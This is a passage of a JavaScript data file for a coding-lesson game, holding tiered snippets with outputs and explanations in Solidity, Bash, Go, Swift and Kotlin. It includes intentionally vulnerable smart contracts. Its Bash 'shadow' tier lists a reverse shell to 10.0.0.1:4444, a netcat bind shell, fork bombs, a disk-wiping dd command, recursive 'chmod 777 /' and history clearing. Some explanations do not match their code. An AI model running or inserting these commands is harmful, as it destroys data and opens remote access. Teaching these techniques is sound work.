                },
                { 
                    ghost: `// 6. Arithmetic Overflow (Pre-0.8)
contract Overflow {
    mapping(address => uint) balances;

    function batchTransfer(address[] memory receivers, uint value) public {
        uint total = receivers.length * value; 
        require(balances[msg.sender] >= total); 
        // If total overflows to 0, check passes!
        for(uint i=0; i<receivers.length; i++) {
            balances[receivers[i]] += value;
        }
    }
}`, 
                    output: "Overflow detected", 
                    explanation: "In older Solidity versions, integers would wrap around. Always use SafeMath or Solidity 0.8+." 
                },
                { 
                    ghost: `// 7. Honeypot: The "Hidden" Revert
contract Box {
    address owner;
    constructor() { owner = msg.sender; }
    function deposit() payable public { owner.transfer(msg.value); }
    function withdraw() public {
        require(msg.sender == owner); 
        // Hidden condition prevents withdrawal
        payable(msg.sender).transfer(address(this).balance);
    }
}`, output: "Funds trapped", explanation: "Honeypots look like vulnerable contracts to tempt attackers, but contain hidden traps to steal their funds." },
                { 
                    ghost: `// 8. Storage Collision (Proxy)
contract Proxy {
    // Slot 0
    address public implementation; 
}
contract Logic {
    // Slot 0 - Collides with Proxy's implementation!
    uint256 public count; 

    function setCount(uint256 _count) public {
        count = _count; // Overwrites implementation address
    }
}`, 
                    output: "Proxy broken", 
                    explanation: "If the Logic contract's storage layout doesn't match the Proxy, writing to variables can corrupt the Proxy state." 
                },
                { 
                    ghost: `// 9. Weak Randomness
contract WeakRandom {
    function guess(uint _guess) public view returns (bool) {
        // block.difficulty is replaced by block.prevrandao in newer Solidity
        uint answer = uint(keccak256(abi.encodePacked(block.timestamp, block.difficulty)));
        return _guess == answer;
    }
}`, output: "Randomness predicted", explanation: "Everything on-chain is deterministic. Use Chainlink VRF for true verifiable randomness." },
                { 
                    ghost: `// Metamorphic Contract (CREATE2 + SELFDESTRUCT)
contract Factory {
    function deploy(bytes memory code, uint salt) public {
        address addr;
        assembly {
            addr := create2(0, add(code, 0x20), mload(code), salt)
        }
    }
}
// 1. Deploy Contract A
// 2. Contract A selfdestructs
// 3. Deploy Contract B to SAME address (using same salt)
`, 
                    output: "Code morphed", 
                    explanation: "By combining CREATE2 and SELFDESTRUCT, you can redeploy different code to the same address. This effectively allows 'upgrading' a contract without a proxy, but changes the code hash." 
                }
            ]
        }
    },
    bash: {
        name: "Bash",
        reference: "https://www.gnu.org/software/bash/manual/",
        tiers: {
            beginner: [
                { ghost: "echo 'HELLO SHADOWCODERS THIS IS MY FOIRST PROGRAM'", output: "HELLO SHADOWCODERS THIS IS MY FOIRST PROGRAM", explanation: "The 'echo' command prints text to the terminal." },
                { ghost: "name='Shadow'; echo $name", output: "Shadow", explanation: "Variables are assigned without spaces and accessed with '$'." },
                { ghost: "touch file.txt", output: "file.txt created", explanation: "'touch' creates an empty file or updates its timestamp." },
                { ghost: "mkdir secret_base", output: "Directory created", explanation: "'mkdir' creates a new directory." },
                { ghost: "ls -la", output: "drwxr-xr-x . .. file.txt", explanation: "'ls' lists files. '-la' shows all files (including hidden) with details." }
            ],
            intermediate: [
                { ghost: "arg=15; if [ $arg -gt 10 ]; then echo 'High'; fi", output: "High", explanation: "Conditionals use '[]' or '[[]]' syntax. '-gt' means greater than." },
                { ghost: "for i in {1..5}; do echo $i; done", output: "1\n2\n3\n4\n5", explanation: "Loops allow repeating commands. '{1..5}' generates a sequence." },
                { ghost: "echo \"error\\nerror\" > log.txt; grep 'error' log.txt | wc -l", output: "2", explanation: "Pipes '|' pass output from one command to another. 'grep' searches, 'wc' counts." },
                { ghost: "function greet() { echo \"Hi $1\"; }", output: "Function defined", explanation: "Functions encapsulate logic. Arguments are accessed via $1, $2, etc." },
                { ghost: "echo 'Log' >> system.log", output: "Appended", explanation: "'>' redirects output (overwrite), '>>' appends to file." }
            ],
            master: [
                { ghost: "echo \"1 A\\n2 B\" > data.txt; awk '{print $2}' data.txt", output: "A\nB", explanation: "'awk' is a powerful text processing language for pattern scanning and processing." },
                { ghost: "echo \"foo test\" > file.txt; sed 's/foo/bar/g' file.txt", output: "bar test", explanation: "'sed' is a stream editor. 's/find/replace/g' performs global substitution." },
                { ghost: "find . -name '*.sh' -exec chmod +x {} \\;", output: "Permissions updated", explanation: "'find' searches for files. '-exec' runs a command on each match." },
                { ghost: "echo '{\"status\": \"ok\"}' | jq .", output: "{\n  \"status\": \"ok\"\n}", explanation: "'curl' fetches data. 'jq' parses and formats JSON output." },
                { ghost: "trap 'rm -f /tmp/tempfile' EXIT", output: "Trap set", explanation: "'trap' executes a command when the script receives a signal (like EXIT)." }
            ],
            legend: [
                { ghost: "mkdir -p dir1 dir2; touch dir1/a dir2/b; diff <(ls dir1) <(ls dir2)", output: "1c1\n< a\n---\n> b", explanation: "Process substitution '<()' feeds command output as a file argument." },
                { ghost: "exec 3<> /dev/tcp/127.0.0.1/8080", output: "Socket opened", explanation: "Bash can open TCP/UDP sockets using file descriptors." },
                { ghost: "arr=(A B C D E); echo ${arr[@]:0:3}", output: "A B C", explanation: "Parameter expansion allows powerful string and array manipulation." },
                { ghost: ":(){ :|:& };:", output: "Do not run this", explanation: "The Fork Bomb. Recursively calls itself piped to itself in background." },
                { ghost: "cat <<EOF > config.conf\nServer=1\nEOF", output: "File written", explanation: "Here-Docs allow writing multi-line strings to files easily." }
            ],
            shadow: [
                { ghost: `( _(){ _;}; _ )`, output: "Crash", explanation: "The Fork Bomb: a function that calls itself recursively in the background, rapidly exhausting system resources." },
                { ghost: `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`, output: "Shell", explanation: "A reverse shell that redirects stdin, stdout, and stderr to a remote TCP connection, allowing remote control." },
                { ghost: `rm -- "$0"`, output: "Deleted", explanation: "Self-deletion: the script removes its own file from the filesystem to hide evidence of its execution." },
                { ghost: `dd if=/dev/urandom of=/dev/sda bs=1M`, output: "Wiped", explanation: "Data destruction: overwriting the hard drive with random data using the 'dd' command." },
                { ghost: `tail -f /var/log/auth.log | grep 'Failed'`, output: "Monitor", explanation: "Real-time monitoring of log files to detect failed login attempts or other security events." },
                { ghost: `: > ~/.bash_history && history -c`, output: "Cleaned", explanation: "Clearing the command history to remove traces of executed commands from the current session and history file." },
                { ghost: `chmod 777 / -R`, output: "Perms Open", explanation: "Recursively setting all files to be readable, writable, and executable by everyone. Destroys security posture." },
                { ghost: `nc -l -p 8080 -e /bin/bash`, output: "Backdoor", explanation: "Using Netcat to listen on a port and execute a shell for anyone who connects (Bind Shell)." },
                { ghost: `touch file.txt; chattr +i file.txt`, output: "Immutable", explanation: "Making a file immutable so it cannot be modified or deleted, even by the root user." },
                { ghost: `echo "127.0.0.1 google.com" >> /etc/hosts`, output: "Redirected", explanation: "DNS Spoofing via the hosts file to redirect traffic for a legitimate domain to a different IP." }
            ]
        }
    },
    go: {
        name: "Go",
        reference: "https://go.dev/doc/",
        tiers: {
            beginner: [
                { ghost: "package main\nimport \"fmt\"\nfunc main() {\n    fmt.Println(\"hello shadowcoders this is my first program\")\n}", output: "hello shadowcoders this is my first program", explanation: "Every Go program starts with a package declaration and a main function." },
                { ghost: "var x int = 10\ny := 20\nfmt.Println(x + y)", output: "30", explanation: "Variables can be declared explicitly or inferred using ':='." },
                { ghost: "x := 10\nif x > 5 {\n    fmt.Println(\"Big\")\n} else {\n    fmt.Println(\"Small\")\n}", output: "Big", explanation: "Conditionals in Go don't need parentheses around the condition." },
                { ghost: "for i := 0; i < 5; i++ {\n    fmt.Println(i)\n}", output: "0\n1\n2\n3\n4", explanation: "Go only has one looping construct: 'for'." },
                { 
                    ghost: "func add(a int, b int) int {\n    return a + b\n}", 
                    output: "Function defined", 
                    explanation: "Functions are first-class citizens with typed arguments and return values.",
                    input: {
                        prompts: ["Enter a: ", "Enter b: "],
                        handler: (args) => {
                            const res = parseInt(args[0]) + parseInt(args[1]);
                            return isNaN(res) ? "Error" : res.toString();
                        }
                    }
                }
            ],
            intermediate: [
                { ghost: `for i := 1; i <= 5; i++ {\n    for j := 0; j < i; j++ {\n        fmt.Print("* ")\n    }\n    fmt.Println()\n}`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "Nested loops can generate patterns like a pyramid." },
                { ghost: "type User struct {\n    Name string\n    Age  int\n}", output: "Struct defined", explanation: "Structs are collections of fields. Go doesn't have classes." },
                { ghost: "type User struct { Name string }\nfunc (u *User) save() {\n    fmt.Println(\"Saved\", u.Name)\n}", output: "Method defined", explanation: "Methods can be defined on types using a receiver argument." },
                { ghost: "arr := []int{1, 2, 3}\nfmt.Println(arr[1])", output: "2", explanation: "Slices are dynamic arrays. They are more common than fixed-size arrays." },
                { ghost: "m := map[string]int{\"one\": 1}\nfmt.Println(m[\"one\"])", output: "1", explanation: "Maps are key-value pairs, similar to dictionaries or hash maps." },
                { ghost: "m := map[string]int{\"one\": 1}\nfor k, v := range m {\n    fmt.Printf(\"%s: %d\", k, v)\n}", output: "one: 1", explanation: "'range' iterates over slices or maps, providing index/key and value." }
            ],
            master: [
                { ghost: "go func() {\n    fmt.Println(\"Async\")\n}()", output: "Async", explanation: "'go' keyword starts a new Goroutine (lightweight thread)." },
                { ghost: "c := make(chan int)\ngo func() { c <- 42 }()\nmsg := <-c", output: "42 received", explanation: "Channels are typed conduits for synchronization and communication between Goroutines." },
                { ghost: "func do(v interface{}) {\n    fmt.Println(v)\n}", output: "Any value", explanation: "'interface{}' (empty interface) can hold values of any type." },
                { ghost: "defer fmt.Println(\"Done\")\nfmt.Println(\"Start\")", output: "Start\nDone", explanation: "'defer' schedules a function call to run after the surrounding function returns." },
                { ghost: "panic(\"Critical Error\")", output: "Panic!", explanation: "'panic' stops normal execution. Usually paired with 'recover' to handle errors." }
            ],
            legend: [
                { ghost: "var mu sync.Mutex\nmu.Lock()\ndefer mu.Unlock()", output: "Locked", explanation: "Mutexes provide mutual exclusion to prevent race conditions." },
                { ghost: "var wg sync.WaitGroup\nwg.Add(1)\ngo func() { wg.Done() }()\nwg.Wait()", output: "Waited", explanation: "WaitGroup waits for a collection of Goroutines to finish." },
                { ghost: "var counter int64\natomic.AddInt64(&counter, 1)", output: "Atomic increment", explanation: "Atomic operations are safe for concurrent use without locks." },
                { ghost: "ctx, cancel := context.WithTimeout(context.Background(), time.Second)", output: "Context created", explanation: "Context controls cancellation and timeouts across API boundaries." },
                { ghost: "x := 10\nt := reflect.TypeOf(x)", output: "Type info", explanation: "Reflection allows inspecting types at runtime." }
            ],
            shadow: [
                { ghost: `package main\nimport "unsafe"\nfunc main() {\n    x := 0\n    p := unsafe.Pointer(&x)\n    *(*int)(p) = 42\n}`, output: "Unsafe Write", explanation: "The 'unsafe' package allows bypassing Go's type system to read and write memory directly." },
                { ghost: `package main\nimport "syscall"\nfunc main() {\n    pid := 1234\n    syscall.Syscall(syscall.SYS_KILL, uintptr(pid), 9, 0)\n}`, output: "Killed", explanation: "Direct system calls allow interacting with the kernel without the standard library wrappers." },
                { ghost: `package main\nimport "plugin"\nfunc main() {\n    plugin.Open("evil.so")\n}`, output: "Plugin Loaded", explanation: "Go plugins allow loading shared libraries at runtime, which can introduce external code execution." },
                { ghost: `// import "C"\n// C.puts(C.CString("Hi"))`, output: "Cgo Call", explanation: "Cgo enables calling C code from Go, useful for legacy libs but introduces memory safety risks." },
                { ghost: `package main\nimport "runtime"\nfunc main() {\n    obj := new(int)\n    runtime.KeepAlive(obj)\n}`, output: "Kept Alive", explanation: "Manually managing object lifetime to prevent premature garbage collection during finalizers." },
                { ghost: `package main\nimport "reflect"\nfunc main() {\n    x := 0\n    reflect.ValueOf(&x).Elem().SetInt(1)\n}`, output: "Reflect Set", explanation: "Using reflection to modify private fields or values that are otherwise inaccessible." },
                { ghost: `package main\nimport "encoding/binary"\nfunc main() {\n    buf := make([]byte, 8)\n    val := uint64(12345)\n    binary.LittleEndian.PutUint64(buf, val)\n}`, output: "Encoded", explanation: "Low-level binary encoding/decoding is essential for network protocols and file formats." },
                { ghost: `package main\nimport "runtime"\nfunc main() {\n    runtime.GOMAXPROCS(1)\n}`, output: "Procs Set", explanation: "Limiting the number of OS threads that can execute user-level Go code simultaneously." },
                { ghost: `package main\nimport "runtime/debug"\nfunc main() {\n    debug.FreeOSMemory()\n}`, output: "Freed", explanation: "Forcing the runtime to return memory to the OS, useful in memory-constrained environments." },
                { ghost: `select {}`, output: "Blocked", explanation: "An empty select statement blocks the Goroutine forever, effectively halting execution." }
            ]
        }
    },
    swift: {
        name: "Swift",
        reference: "https://docs.swift.org/swift-book/",
        tiers: {
            beginner: [
                { ghost: "print(\"hello shadowcoders this is my first program\")", output: "hello shadowcoders this is my first program", explanation: "'print' writes text to the console." },
                { ghost: "var name = \"Shadow\"\nlet max = 10", output: "Variables set", explanation: "'var' creates mutable variables. 'let' creates constants (immutable)." },
                { ghost: "var optional: Int? = 10\nif let val = optional {\n    print(val)\n}", output: "Unwrapped", explanation: "Optional binding ('if let') safely unwraps optionals if they have a value." },
                { ghost: "let arr = [1, 2, 3]\nprint(arr[0])", output: "1", explanation: "Arrays are ordered collections of values." },
                { ghost: "let dict = [\"key\": \"value\"]\nprint(dict[\"key\"]!)", output: "value", explanation: "Dictionaries are key-value pairs. Accessing returns an optional." }
            ],
            intermediate: [
                { ghost: `for i in 1...5 {\n    print(String(repeating: "* ", count: i))\n}`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "String(repeating:count:) is useful for pattern generation." },
                { 
                    ghost: "func greet(name: String) -> String {\n    return \"Hello \" + name\n}", 
                    output: "Function defined", 
                    explanation: "Functions have argument labels and return types.",
                    input: {
                        prompts: ["Enter name: "],
                        handler: (args) => `Hello ${args[0]}`
                    }
                },
                { ghost: "let closure = { (x: Int) -> Int in\n    return x * 2\n}", output: "Closure defined", explanation: "Closures are self-contained blocks of functionality (lambdas)." },
                { ghost: "enum State {\n    case active, inactive\n}", output: "Enum defined", explanation: "Enums define a common type for a group of related values." },
                { ghost: "struct Point {\n    var x: Int\n    var y: Int\n}", output: "Struct defined", explanation: "Structs are value types, copied when passed around." },
                { ghost: "class Person {\n    var name: String = \"\"\n}", output: "Class defined", explanation: "Classes are reference types, shared when passed around." }
            ],
            master: [
                { ghost: "protocol Drawable {\n    func draw()\n}", output: "Protocol defined", explanation: "Protocols define a blueprint of methods that a conforming type must implement." },
                { ghost: "extension String {\n    func shout() -> String { return self + \"!\" }\n}", output: "Extension added", explanation: "Extensions add new functionality to existing types." },
                { ghost: "func swap<T>(_ a: inout T, _ b: inout T) {\n    (a, b) = (b, a)\n}", output: "Generic function", explanation: "Generics allow writing flexible, reusable functions and types." },
                { ghost: "protocol Delegate: AnyObject {}\nweak var delegate: Delegate?", output: "Weak reference", explanation: "'weak' prevents strong reference cycles (memory leaks)." },
                { ghost: "func perform() throws { throw NSError(domain: \"\", code: 1) }\ndo {\n    try perform()\n} catch {\n    print(error)\n}", output: "Error handled", explanation: "Error handling uses do-try-catch blocks." }
            ],
            legend: [
                { ghost: "@resultBuilder\nstruct HtmlBuilder { static func buildBlock(_ components: String...) -> String { components.joined() } }", output: "Builder defined", explanation: "Result builders enable declarative syntax (like SwiftUI)." },
                { ghost: "@propertyWrapper\nstruct TwelveOrLess { private var n: Int = 0; var wrappedValue: Int { get { n } set { n = min(newValue, 12) } } }", output: "Wrapper defined", explanation: "Property wrappers encapsulate read/write logic for properties." },
                { ghost: "func fetch() async -> Int { 1 }\nasync let x = fetch()\nlet y = await x", output: "Async result", explanation: "Async/await simplifies asynchronous concurrency." },
                { ghost: "actor BankAccount {\n    var balance = 0\n    func deposit() { balance += 100 }\n}", output: "Actor defined", explanation: "Actors protect their mutable state from concurrent access." },
                { ghost: "let ptr = UnsafeMutablePointer<Int>.allocate(capacity: 1)", output: "Memory allocated", explanation: "Unsafe pointers allow manual memory management." }
            ],
            shadow: [
                { ghost: "class A { var id = UUID() }\nlet obj = A()\nlet u = Unmanaged.passRetained(obj)", output: "Unmanaged ref", explanation: "Bypassing ARC to manually manage object lifecycle." },
                { ghost: "let obj = \"test\"\nlet mirror = Mirror(reflecting: obj)", output: "Mirror created", explanation: "Mirror API allows runtime introspection of object structure." },
                { ghost: "let obj = 10\nlet bits = unsafeBitCast(obj, to: UInt.self)", output: "Bits casted", explanation: "Reinterprets the bytes of a value as another type." },
                { ghost: "@_exported import Foundation", output: "Exported", explanation: "Underscored attributes are internal/private compiler features." },
                { ghost: "import simd\nlet v = SIMD4<Float>(1, 2, 3, 4)", output: "SIMD vector", explanation: "SIMD (Single Instruction, Multiple Data) for high-performance math." },
                { ghost: "@_cdecl(\"my_c_func\")\nfunc mySwiftFunc() { print(\"C called\") }", output: "C Export", explanation: "Exposing Swift functions to C using the @_cdecl attribute." },
                { ghost: "let obj = [1, 2, 3]\nobj.withUnsafeBytes { ptr in print(ptr) }", output: "Raw Bytes", explanation: "Accessing the raw underlying bytes of an object." },
                { ghost: "@dynamicCallable\nstruct Toy { func dynamicallyCall(withArguments args: [Int]) { print(args) } }", output: "Dynamic Call", explanation: "Allows instances of a type to be called like functions." },
                { ghost: "let ptr = UnsafeMutableRawPointer.allocate(byteCount: 8, alignment: 8)", output: "Raw Alloc", explanation: "Manual memory allocation without type safety." },
                { ghost: "let ptr = UnsafeMutableRawPointer.allocate(byteCount: 8, alignment: 8)\nptr.bindMemory(to: Int.self, capacity: 1)", output: "Bound", explanation: "Binding raw memory to a specific type for typed access." }
            ]
        }
    },
    kotlin: {
        name: "Kotlin",
        reference: "https://kotlinlang.org/docs/home.html",
        tiers: {
            beginner: [
                { ghost: "fun main() {\n    println(\"hello shadowcoders this is my first program\")\n}", output: "hello shadowcoders this is my first program", explanation: "The entry point is 'main'. 'println' outputs text." },
                { ghost: "val name = \"Shadow\"\nvar age = 20", output: "Variables set", explanation: "'val' is immutable (read-only), 'var' is mutable." },
                { ghost: "val name = \"Shadow\"\nval msg = \"Hello $name\"", output: "Hello Shadow", explanation: "String templates allow embedding variables directly using '$'." },
                { ghost: "val x = 20\nif (x > 10) println(\"Big\") else println(\"Small\")", output: "Output", explanation: "'if' is an expression in Kotlin, meaning it returns a value." },
                { ghost: "for (i in 1..5) println(i)", output: "1\n2\n3\n4\n5", explanation: "Loops over a range are concise: '1..5' creates a range." }
            ],
            intermediate: [
                { ghost: `for (i in 1..5) {\n    println("* ".repeat(i))\n}`, output: "*\n* *\n* * *\n* * * *\n* * * * *", explanation: "String.repeat() makes pattern printing simple." },
                { ghost: "class User(val name: String)", output: "Class defined", explanation: "Classes are defined concisely. Primary constructor is in the header." },
                { ghost: "data class Point(val x: Int, val y: Int)", output: "Data class", explanation: "Data classes automatically generate equals, hashCode, toString, copy." },
                { ghost: "var name: String? = null\nprintln(name?.length)", output: "null", explanation: "Null safety is built-in. '?' marks nullable types." },
                { ghost: "fun String.lastChar() = this.get(length - 1)", output: "Extension", explanation: "Extension functions add methods to existing classes without inheritance." },
                { ghost: "val sum = { x: Int, y: Int -> x + y }", output: "Lambda", explanation: "Lambdas are anonymous functions passed as values." }
            ],
            master: [
                { ghost: "import kotlinx.coroutines.*\nfun main() { GlobalScope.launch {\n    delay(1000L)\n    println(\"World\")\n} }", output: "Coroutine", explanation: "Coroutines are light-weight threads for asynchronous programming." },
                { ghost: "import kotlinx.coroutines.flow.*\nimport kotlinx.coroutines.*\nfun main() = runBlocking {\n    flow {\n        emit(1)\n        emit(2)\n    }.collect { println(it) }\n}", output: "1\n2", explanation: "Flow is a cold asynchronous data stream." },
                { ghost: "val str = \"Hello\".let { it.uppercase() }", output: "HELLO", explanation: "Scope functions (let, run, with, apply, also) execute code in object context." },
                { ghost: "val p: String by lazy { \"Heavy\" }", output: "Lazy", explanation: "Delegated properties allow reusing property logic (e.g., lazy initialization)." },
                { ghost: "sealed class Result\nclass Success : Result()", output: "Sealed", explanation: "Sealed classes represent restricted class hierarchies (enums on steroids)." }
            ],
            legend: [
                { ghost: "inline fun <reified T> isType(value: Any) = value is T", output: "Reified", explanation: "Inline functions with reified types allow accessing type info at runtime." },
                { ghost: "infix fun Int.times(str: String) = str.repeat(this)", output: "Infix", explanation: "Infix functions allow calling without dot and parentheses: '2 times \"Hi\"'." },
                { ghost: "data class Point(val x: Int, val y: Int)\noperator fun Point.plus(other: Point) = Point(x + other.x, y + other.y)", output: "Operator", explanation: "Operator overloading allows defining custom behavior for operators like '+'." },
                { ghost: "suspend fun fetchData(): String { return \"Data\" }", output: "Suspend", explanation: "Suspend functions can pause execution without blocking the thread." },
                { ghost: "expect fun platform(): String\nactual fun platform() = \"JVM\"", output: "Multiplatform", explanation: "Expect/actual mechanism for Kotlin Multiplatform code." }
            ],
            shadow: [
                { ghost: "val kClass = String::class", output: "KClass", explanation: "KClass represents a class in Kotlin reflection API." },
                { ghost: "val f = sun.misc.Unsafe::class.java.getDeclaredField(\"theUnsafe\")\nf.isAccessible = true\nval unsafe = f.get(null) as sun.misc.Unsafe", output: "Unsafe", explanation: "Accessing internal JVM Unsafe API (requires specific setup)." },
                { ghost: "dynamic val d = js(\"console.log('Hi')\")", output: "Dynamic", explanation: "Dynamic type in Kotlin/JS allows untyped access." },
                { ghost: "// @JvmField var x = 1", output: "Annotation", explanation: "Controlling JVM bytecode generation via annotations." },
                { ghost: "external fun nativeMethod(): Int", output: "Native", explanation: "Declaring native methods implemented in C/C++ (JNI)." },
                { ghost: "import kotlin.contracts.*\n@ExperimentalContracts\nfun isNotNull(x: Any?): Boolean {\n    contract { returns(true) implies (x != null) }\n    return x != null\n}", output: "Contract", explanation: "Contracts allow telling the compiler about function behavior to improve smart casting." },
                { ghost: "import kotlin.jvm.JvmInline\n@JvmInline value class Password(val s: String)", output: "Value Class", explanation: "Value classes wrap a primitive type without runtime overhead." },
                { ghost: "@Volatile var running = true", output: "Volatile", explanation: "Marking a variable as volatile ensures writes are visible to other threads immediately." },
                { ghost: "import kotlin.reflect.KProperty\noperator fun getValue(thisRef: Any?, prop: KProperty<*>) { return }", output: "Delegate", explanation: "Implementing delegate operators allows creating custom property delegates." },
                { ghost: "fun <T> List<T>.custom(): List<T> { return this }", output: "Extension", explanation: "Advanced extension functions can add functionality to third-party libraries." }
            ]
        }
    }
};
